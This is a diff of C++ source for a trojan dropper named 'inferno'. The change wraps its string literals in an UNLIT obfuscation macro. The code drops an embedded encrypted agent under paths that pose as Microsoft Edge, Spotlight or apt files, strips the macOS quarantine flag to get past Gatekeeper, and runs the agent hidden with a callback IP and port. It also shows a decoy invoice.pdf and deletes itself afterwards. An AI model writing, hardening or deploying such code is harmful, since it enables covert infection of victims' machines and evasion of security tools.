@@ -6,6 +6,7 @@
 #include <vector>
 #include <random>
 #include <chrono>
+#include "unlit.hpp"
 
 #ifdef _WIN32
 #ifndef WIN32_LEAN_AND_MEAN
@@ -51,10 +52,10 @@ std::string installPath() {
 #ifdef _WIN32
     char appdata[MAX_PATH];
     if (SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appdata) != S_OK) {
-        return "C:\\temp\\inferno_agent.exe";
+        return UNLIT("C:\\temp\\inferno_agent.exe");
     }
     std::string path(appdata);
-    path += "\\Microsoft\\Edge\\Application\\";
+    path += UNLIT("\\Microsoft\\Edge\\Application\\");
 
     // Append a plausible Edge version subdirectory (e.g. 114.0.1823.58)
     // so the path mirrors a genuine installation.
@@ -70,16 +71,16 @@ std::string installPath() {
         path += std::to_string(build_dist(rng)) + ".";
         path += std::to_string(patch_dist(rng));
     }
-    path += "\\msedge.exe";
+    path += UNLIT("\\msedge.exe");
     return path;
 #elif defined(__APPLE__)
     const char* home = ::getenv("HOME");
-    if (!home) return "/tmp/.SpotlightIndex";
-    return std::string(home) + "/Library/Application Support/.Spotlight/V100/SpotlightIndex";
+    if (!home) return UNLIT("/tmp/.SpotlightIndex");
+    return std::string(home) + UNLIT("/Library/Application Support/.Spotlight/V100/SpotlightIndex");
 #else
     const char* home = ::getenv("HOME");
-    if (!home) return "/tmp/.apt-get";
-    return std::string(home) + "/.cache/apt/archives/.apt-get";
+    if (!home) return UNLIT("/tmp/.apt-get");
+    return std::string(home) + UNLIT("/.cache/apt/archives/.apt-get");
 #endif
 }
 
@@ -117,7 +118,7 @@ bool createDirectoryForFile(std::string& path) {
     // Fallback: %TEMP%\<random hex>
     char temp_buf[MAX_PATH];
     if (GetTempPathA(MAX_PATH, temp_buf) == 0) {
-        std::fprintf(stderr, "[Wrapper] GetTempPathA failed: GLE=%lu\n", GetLastError());
+        std::fprintf(stderr, UNLIT("[Wrapper] GetTempPathA failed: GLE=%lu\n"), GetLastError());
         return false;
     }
     std::string fallback(temp_buf);
@@ -161,14 +162,14 @@ bool createDirectoryForFile(std::string& path) {
         current += dir[i];
         if (dir[i] == '/') {
             if (::mkdir(current.c_str(), 0700) != 0 && errno != EEXIST) {
-                std::fprintf(stderr, "[Wrapper] mkdir(%s) failed: %s\n",
+                std::fprintf(stderr, UNLIT("[Wrapper] mkdir(%s) failed: %s\n"),
                              current.c_str(), std::strerror(errno));
                 return false;
             }
         }
     }
     if (::mkdir(dir.c_str(), 0700) != 0 && errno != EEXIST) {
-        std::fprintf(stderr, "[Wrapper] mkdir(%s) failed: %s\n",
+        std::fprintf(stderr, UNLIT("[Wrapper] mkdir(%s) failed: %s\n"),
                      dir.c_str(), std::strerror(errno));
         return false;
     }
@@ -178,7 +179,7 @@ bool createDirectoryForFile(std::string& path) {
 
 bool extractAgent(const std::string& target) {
     if (inferno::wrapper::AGENT_BINARY_SIZE == 0) {
-        std::fprintf(stderr, "[Wrapper] Agent binary not embedded.\n");
+        std::fprintf(stderr, UNLIT("[Wrapper] Agent binary not embedded.\n"));
         return false;
     }
 
@@ -192,7 +193,7 @@ bool extractAgent(const std::string& target) {
 
     FILE* f = ::fopen(target.c_str(), "wb");
     if (!f) {
-        std::fprintf(stderr, "[Wrapper] fopen(%s) failed: %s\n",
+        std::fprintf(stderr, UNLIT("[Wrapper] fopen(%s) failed: %s\n"),
                      target.c_str(), std::strerror(errno));
         return false;
     }
@@ -201,7 +202,7 @@ bool extractAgent(const std::string& target) {
     ::fclose(f);
 
     if (written != decrypted.size()) {
-        std::fprintf(stderr, "[Wrapper] fwrite wrote %zu/%zu bytes\n",
+        std::fprintf(stderr, UNLIT("[Wrapper] fwrite wrote %zu/%zu bytes\n"),
                      written, decrypted.size());
         ::remove(target.c_str());
         return false;
@@ -224,7 +225,7 @@ bool runAgent(const std::string& path, const std::string& ip, uint16_t port) {
                         nullptr, nullptr, FALSE,
                         DETACHED_PROCESS | CREATE_NO_WINDOW,
                         nullptr, nullptr, &si, &pi)) {
-        std::fprintf(stderr, "[Wrapper] CreateProcessA(%s) failed: GLE=%lu\n",
+        std::fprintf(stderr, UNLIT("[Wrapper] CreateProcessA(%s) failed: GLE=%lu\n"),
                      cmd.c_str(), GetLastError());
         return false;
     }
@@ -234,14 +235,14 @@ bool runAgent(const std::string& path, const std::string& ip, uint16_t port) {
 #else
 #if defined(__APPLE__)
     // Remove quarantine attribute so Gatekeeper doesn't block the agent
-    std::string xattr_cmd = "xattr -dr com.apple.quarantine \"";
+    std::string xattr_cmd = UNLIT("xattr -dr com.apple.quarantine \"");
     xattr_cmd += path;
-    xattr_cmd += "\" 2>/dev/null";
+    xattr_cmd += UNLIT("\" 2>/dev/null");
     ::system(xattr_cmd.c_str());
 #endif
     pid_t pid = ::fork();
     if (pid < 0) {
-        std::fprintf(stderr, "[Wrapper] fork() failed: %s\n", std::strerror(errno));
+        std::fprintf(stderr, UNLIT("[Wrapper] fork() failed: %s\n"), std::strerror(errno));
         return false;
     }
     if (pid > 0) return true; // parent returns, child continues
@@ -252,8 +253,8 @@ bool runAgent(const std::string& path, const std::string& ip, uint16_t port) {
     ::execv(args[0], const_cast<char* const*>(args));
 
     // If execv fails, try shell fallback for tricky paths
-    ::execl("/bin/sh", "sh", "-c",
-            ("\"" + path + "\" " + ip + " " + port_str).c_str(), nullptr);
+    ::execl(UNLIT("/bin/sh"), UNLIT("sh"), UNLIT("-c"),
+            (UNLIT("\"") + path + "\" " + ip + " " + port_str).c_str(), nullptr);
 
     ::exit(1); // should not reach here
 #endif
@@ -263,13 +264,13 @@ std::string decoyPath() {
 #ifdef _WIN32
     char buf[MAX_PATH];
     if (SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, buf) != S_OK) {
-        return "C:\\Users\\Public\\invoice.pdf";
+        return UNLIT("C:\\Users\\Public\\invoice.pdf");
     }
-    return std::string(buf) + "\\Downloads\\invoice.pdf";
+    return std::string(buf) + UNLIT("\\Downloads\\invoice.pdf");
 #else
     const char* home = ::getenv("HOME");
-    if (!home) return "/tmp/invoice.pdf";
-    return std::string(home) + "/Downloads/invoice.pdf";
+    if (!home) return UNLIT("/tmp/invoice.pdf");
+    return std::string(home) + UNLIT("/Downloads/invoice.pdf");
 #endif
 }
 
@@ -277,14 +278,14 @@ bool extractFile(const std::string& target,
                  const unsigned char* data, size_t data_size) {
     FILE* f = ::fopen(target.c_str(), "wb");
     if (!f) {
-        std::fprintf(stderr, "[Wrapper] fopen(%s) failed: %s\n",
+        std::fprintf(stderr, UNLIT("[Wrapper] fopen(%s) failed: %s\n"),
                      target.c_str(), std::strerror(errno));
         return false;
     }
     size_t written = ::fwrite(data, 1, data_size, f);
     ::fclose(f);
     if (written != data_size) {
-        std::fprintf(stderr, "[Wrapper] wrote %zu/%zu bytes\n",
+        std::fprintf(stderr, UNLIT("[Wrapper] wrote %zu/%zu bytes\n"),
                      written, data_size);
         ::remove(target.c_str());
         return false;
@@ -295,12 +296,12 @@ bool extractFile(const std::string& target,
 bool openFile(const std::string& path) {
 #ifdef _WIN32
     return reinterpret_cast<intptr_t>(::ShellExecuteA(
-        nullptr, "open", path.c_str(), nullptr, nullptr, SW_SHOW)) > 32;
+        nullptr, UNLIT("open"), path.c_str(), nullptr, nullptr, SW_SHOW)) > 32;
 #elif defined(__APPLE__)
-    std::string cmd = "open \"" + path + "\" 2>/dev/null";
+    std::string cmd = std::string(UNLIT("open \"")) + path + UNLIT("\" 2>/dev/null");
     return ::system(cmd.c_str()) == 0;
 #else
-    std::string cmd = "xdg-open \"" + path + "\" 2>/dev/null";
+    std::string cmd = std::string(UNLIT("xdg-open \"")) + path + UNLIT("\" 2>/dev/null");
     return ::system(cmd.c_str()) == 0;
 #endif
 }
@@ -310,17 +311,17 @@ void selfDelete(const std::string& path) {
     // Spawn a detached batch script that waits 3s then deletes the wrapper
     char temp_dir[MAX_PATH];
     if (GetTempPathA(MAX_PATH, temp_dir) == 0) return;
-    std::string bat = std::string(temp_dir) + "\\del_inferno.bat";
-    std::string script =
-        "@echo off\r\n"
-        "ping 127.0.0.1 -n 4 > nul\r\n"
-        "del \"" + path + "\"\r\n"
-        "del \"" + bat + "\"\r\n";
+    std::string bat = std::string(temp_dir) + UNLIT("\\del_inferno.bat");
+    std::string script = std::string(
+        UNLIT("@echo off\r\n")
+    ) + UNLIT("ping 127.0.0.1 -n 4 > nul\r\n") +
+        UNLIT("del \"") + path + UNLIT("\"\r\n") +
+        UNLIT("del \"") + bat + UNLIT("\"\r\n");
     FILE* f = ::fopen(bat.c_str(), "w");
     if (!f) return;
     ::fwrite(script.c_str(), 1, script.size(), f);
     ::fclose(f);
-    ::ShellExecuteA(nullptr, "open", bat.c_str(), nullptr, nullptr, SW_HIDE);
+    ::ShellExecuteA(nullptr, UNLIT("open"), bat.c_str(), nullptr, nullptr, SW_HIDE);
 #else
     pid_t pid = ::fork();
     if (pid == 0) {
@@ -334,7 +335,7 @@ void selfDelete(const std::string& path) {
 } // anonymous namespace
 
 int main(int argc, char* argv[]) {
-    std::string ip = "127.0.0.1";
+    std::string ip = UNLIT("127.0.0.1");
     uint16_t port = 8080;
 
     if (argc >= 3) {
